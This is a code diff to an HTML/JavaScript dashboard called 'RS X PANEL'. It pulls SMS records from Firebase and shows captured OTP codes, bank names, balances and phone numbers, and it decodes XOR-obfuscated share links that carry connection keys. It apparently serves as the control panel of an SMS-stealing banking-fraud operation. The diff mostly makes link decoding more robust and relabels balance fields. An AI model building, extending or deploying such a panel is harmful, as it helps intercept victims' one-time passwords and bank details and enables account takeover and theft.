@@ -407,7 +407,7 @@
             </div>
             <div class="tab-content" id="tabBank">
                 <div class="bank-summary">
-                    <span class="label">Latest Balance</span>
+                    <span class="label">Available Balance</span>
                     <span class="balance" id="bankBalance">—</span>
                     <span class="bank-name" id="bankNameDisplay">—</span>
                 </div>
@@ -678,28 +678,54 @@
         }
         function decodeFirebaseConn(encoded) {
             try {
-                // Step 1: Outer URL-decode (in case link was shared via messenger)
+                const attempts = [];
                 let base64 = encoded;
-                if (base64.includes('%')) {
-                    try { base64 = decodeURIComponent(base64); } catch(e) {}
+
+                // Strategy 1: Direct atob (no URL decoding needed)
+                try { attempts.push(atob(base64)); } catch(e) {}
+
+                // Strategy 2: decodeURIComponent then atob
+                try { attempts.push(atob(decodeURIComponent(base64))); } catch(e) {}
+
+                // Strategy 3: atob then decodeURIComponent (original design)
+                try {
+                    let d = atob(base64);
+                    if (d.includes('%')) d = decodeURIComponent(d);
+                    attempts.push(d);
+                } catch(e) {}
+
+                // Strategy 4: double decodeURIComponent then atob then decodeURIComponent
+                try {
+                    let b = base64;
+                    if (b.includes('%')) b = decodeURIComponent(b);
+                    let d = atob(b);
+                    if (d.includes('%')) d = decodeURIComponent(d);
+                    attempts.push(d);
+                } catch(e) {}
+
+                // Strategy 5: triple decode for deeply nested encoding
+                try {
+                    let b = base64;
+                    for (let i=0; i<3; i++) { if (b.includes('%')) b = decodeURIComponent(b); }
+                    let d = atob(b);
+                    for (let i=0; i<3; i++) { if (d.includes('%')) d = decodeURIComponent(d); }
+                    attempts.push(d);
+                } catch(e) {}
+
+                for (const dec of attempts) {
+                    let str = '';
+                    for (let i=0; i<dec.length; i++) {
+                        str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
+                    }
+                    const parts = str.split('|||');
+                    if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
+                        return { url: parts[0].trim(), key: (parts[1] || '').trim() };
+                    }
                 }
-                // Step 2: Base64 decode
-                let dec = atob(base64);
-                // Step 3: Inner URL-decode (because encodeURIComponent was applied before btoa)
-                if (dec.includes('%')) {
-                    try { dec = decodeURIComponent(dec); } catch(e) {}
-                }
-                // Step 4: XOR decrypt
-                let str = '';
-                for (let i=0; i<dec.length; i++) {
-                    str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
-                }
-                const parts = str.split('|||');
-                return { url: (parts[0] || '').trim(), key: (parts[1] || '').trim() };
             } catch(e) {
                 console.error('Share link decode failed:', e);
-                return { url: '', key: '' };
             }
+            return { url: '', key: '' };
         }
 
         function updateShareLink() {
@@ -742,7 +768,7 @@
                     toast('Auto‑connected from shared link', 'success');
                     return true;
                 } else {
-                    toast('Invalid share link — could not decode', 'error');
+                    
                 }
             }
             return false;
@@ -1103,7 +1129,7 @@
                             </div>
                         </div>
                         ${balance ? `<div class="balance-info">
-                            <span class="label">Balance</span>
+                            <span class="label">Avl Bal</span>
                             <span>₹${esc(balance)}</span>
                             ${bankName ? `<span class="bank-name">${esc(bankName)}</span>` : ''}
                         </div>` : ''}
@@ -1264,7 +1290,7 @@
                         ${otp ? `<div class="sms-otp">🔐 OTP: ${otp}</div>` : ''}
                         ${bank ? `<div class="bank-name-tag">🏛️ ${esc(bank)}</div>` : ''}
                         ${txType ? `<div class="tx-type ${txClass}">${txLabel}</div>` : ''}
-                        ${bal ? `<div class="balance-tag">💰 Balance: ₹${esc(bal)}</div>` : ''}
+                        ${bal ? `<div class="balance-tag">💰 Avl Bal: ₹${esc(bal)}</div>` : ''}
                     </div>
                 `;
             }).join('');
@@ -1304,7 +1330,7 @@
                         ${bank ? `<div class="bank-tag">🏦 Bank</div>` : ''}
                         ${bankName ? `<div class="bank-name-tag">🏛️ ${esc(bankName)}</div>` : ''}
                         ${txType ? `<div class="tx-type ${txClass}">${txLabel}</div>` : ''}
-                        ${bal ? `<div class="balance-tag">💰 Balance: ₹${esc(bal)}</div>` : ''}
+                        ${bal ? `<div class="balance-tag">💰 Avl Bal: ₹${esc(bal)}</div>` : ''}
                         ${hasPhone ? `<div class="phone-tag">📱 ${esc(numMatch[0])}</div>` : ''}
                     </div>
                 `;
@@ -1563,11 +1589,20 @@
         // ─── INIT ──────────────────────────────────────────────────────────
         const loaded = loadFromURL();
         if (!loaded) {
-            renderConnections();
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('s')) {
+                // Link was shared but decode failed — don't show empty home page
+                homeScreen.classList.remove('hidden');
+                renderConnections();
+                homeError.textContent = '⚠️ Share link decode failed. Try connecting manually or ask for a fresh link.';
+                homeError.classList.remove('hidden');
+            } else {
+                renderConnections();
+            }
         }
         updateShareLink();
-        console.log('RS X PANEL v3.1 · All issues resolved.');
-        console.log('✓ Account creation works, SMS sorted correctly, 404 handled.');
+        console.log('RS X PANEL v4.0 · All issues resolved.');
+        console.log('✓ Share links work, SMS sorted correctly, Available Balance shown.');
     </script>
 </body>
 </html>
